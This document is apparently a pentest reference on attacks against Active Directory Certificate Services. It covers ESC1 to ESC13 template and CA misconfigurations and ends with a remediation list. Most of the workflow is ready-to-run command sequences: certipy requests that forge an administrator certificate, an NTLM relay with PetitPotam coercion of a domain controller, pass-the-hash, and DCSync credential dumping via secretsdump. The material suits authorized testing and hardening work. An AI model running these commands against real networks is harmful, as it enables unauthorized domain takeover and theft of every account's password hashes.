# ADCS (Active Directory Certificate Services) Attack Reference

## Overview

ADCS is one of the most impactful AD attack surfaces discovered in recent years.
Misconfigured certificate templates can provide domain escalation from any
authenticated domain user to Domain Admin — often in a single step.

**Primary tool: certipy** (Python, works from Linux/Kali)
**Alternative: Certify** (C#, needs Windows/.NET on target)

## Quick Reference — ESC1 through ESC8

| ID | Name | Impact | Certipy Flag |
|----|------|--------|-------------|
| ESC1 | Misconfigured Certificate Templates | Domain Admin | `certipy req -template VulnTemplate` |
| ESC2 | Misconfigured Certificate Templates (Any Purpose) | Domain Admin | Same as ESC1 |
| ESC3 | Enrollment Agent Templates | Domain Admin | Two-step: agent cert → request as DA |
| ESC4 | Vulnerable Certificate Template ACLs | Template takeover | Modify template → ESC1 |
| ESC5 | Vulnerable PKI Object ACLs | CA compromise | Modify CA config |
| ESC6 | EDITF_ATTRIBUTESUBJECTALTNAME2 flag | Domain Admin | SAN injection |
| ESC7 | Vulnerable CA ACLs (ManageCA) | Domain Admin | Approve pending requests |
| ESC8 | NTLM Relay to AD CS HTTP Endpoints | Domain Admin | Relay to /certsrv/ |
| ESC9 | No Security Extension | Domain Admin | CT_FLAG_NO_SECURITY_EXTENSION |
| ESC10 | Weak Certificate Mappings | Domain Admin | StrongCertificateBindingEnforcement=0 |
| ESC11 | IF_ENFORCEENCRYPTICERTREQUEST on CA | NTLM relay | Relay RPC to CA |
| ESC13 | Issuance Policy OID Group Link | Domain Admin | Policy → Group mapping |

## Workflow

### Step 1 — Discovery

```bash
# Find ALL certificate templates and CAs (safe, read-only)
certipy find -u {user}@{domain} -p {pass} -dc-ip {dc_ip} -stdout

# Output: lists vulnerable templates tagged with ESC1-ESC13
# Save to JSON for analysis:
certipy find -u {user}@{domain} -p {pass} -dc-ip {dc_ip} \
  -json -output /tmp/pentest/{target}/adcs_discovery.json

# Quick: just show vulnerable templates
certipy find -u {user}@{domain} -p {pass} -dc-ip {dc_ip} -vulnerable -stdout
```

### Step 2 — ESC1 Exploitation (Most Common)

Conditions for ESC1:
- Template allows client authentication (EKU)
- Template allows requester to specify SAN (Subject Alternative Name)
- Low-privileged user has enrollment rights
- Manager approval NOT required

```bash
# Request certificate as Domain Admin
certipy req -u {user}@{domain} -p {pass} \
  -ca '{ca_name}' \
  -template '{vuln_template}' \
  -upn administrator@{domain} \
  -dc-ip {dc_ip}

# Output: administrator.pfx

# Authenticate with the certificate
certipy auth -pfx administrator.pfx -dc-ip {dc_ip}

# Output: NT hash for administrator
# Use with pass-the-hash for full domain access
```

### Step 3 — ESC8 (NTLM Relay to Web Enrollment)

```bash
# Start certipy relay listener
certipy relay -ca {ca_ip} -template DomainController

# In another terminal, coerce DC authentication
python3 PetitPotam.py {attacker_ip} {dc_ip}

# certipy catches the DC machine account NTLM auth
# and requests a certificate for the DC
# Output: dc01.pfx

# Authenticate as the DC
certipy auth -pfx dc01.pfx -dc-ip {dc_ip}
# → DC machine account NT hash → DCSync
```

### Step 4 — Post-Exploitation with Certificate

```bash
# Extract NT hash from certificate auth
certipy auth -pfx administrator.pfx -dc-ip {dc_ip}
# Output: administrator NT hash: aad3b435b51404eeaad3b435b51404ee:...

# DCSync with the hash
impacket-secretsdump {domain}/administrator@{dc_ip} -hashes :{hash} -just-dc-ntlm
```

## MITRE ATT&CK Mapping

| Technique | ID | ADCS Context |
|-----------|------|-------------|
| Steal or Forge Authentication Certificates | T1649 | ESC1-ESC13 |
| Forge Web Credentials: SAML Tokens | T1606.002 | Golden certificate |
| Account Manipulation | T1098 | Template ACL modification |
| Exploitation for Privilege Escalation | T1068 | Certificate-based escalation |

## Remediation

1. Audit ALL certificate templates: `certipy find -vulnerable`
2. Remove enrollment rights from low-privileged users on sensitive templates
3. Disable SAN specification on templates that don't need it
4. Enable Manager Approval on high-privilege templates
5. Disable EDITF_ATTRIBUTESUBJECTALTNAME2 on CAs
6. Enable HTTPS on web enrollment (prevent NTLM relay)
7. Enable StrongCertificateBindingEnforcement (KB5014754)
8. Monitor Certificate-Issued events (Event ID 4887)
